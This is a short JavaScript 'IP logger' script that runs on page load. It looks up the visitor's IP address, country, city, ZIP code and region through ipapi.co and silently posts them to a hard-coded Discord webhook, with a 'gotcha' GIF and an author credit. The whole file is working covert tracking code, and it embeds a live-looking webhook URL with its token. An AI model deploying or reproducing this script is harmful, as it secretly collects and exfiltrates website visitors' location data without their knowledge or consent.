const webhook = "https://discord.com/api/webhooks/1575388200455766036/w26gHMKU9pnwpxNlrdjAvNQ96ddQbVyfE2V45PH96kYCebUAEtQA-DsK025Gr-d563AR";

async function IP_Info() {
  try {
    let response = await fetch("https://ipapi.co");
    let value = await response.json();

    if (value && value.ip) {
      await fetch(webhook, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: "``New Visitor``",
          embeds: [{
            title: "Visitor IP",
            type: "rich",
            color: 12223968,
            description: "```IP information of the recent website visitor.```",
            fields: [
              { name: "IP", value: `${value.ip || "未知"}`, inline: false },
              { name: "Country", value: `${value.country_name || "未知"}`, inline: false },
              { name: "City", value: `${value.city || "未知"}`, inline: false },
              { name: "ZIP", value: `${value.postal || "未知"}`, inline: false },
              { name: "Region", value: `${value.region || "未知"}`, inline: false }
            ],
            footer: {
              text: "Programmed by Z3NTL3"
            },
            thumbnail: {
              url: "https://media.tenor.com/h2AVqgVw4ZoAAAAC/gotcha-michael-madsen.gif"
            }
          }]
        })
      });
    }
  } catch (err) {
    console.log("Request not sent:", err);
  }
}

IP_Info();
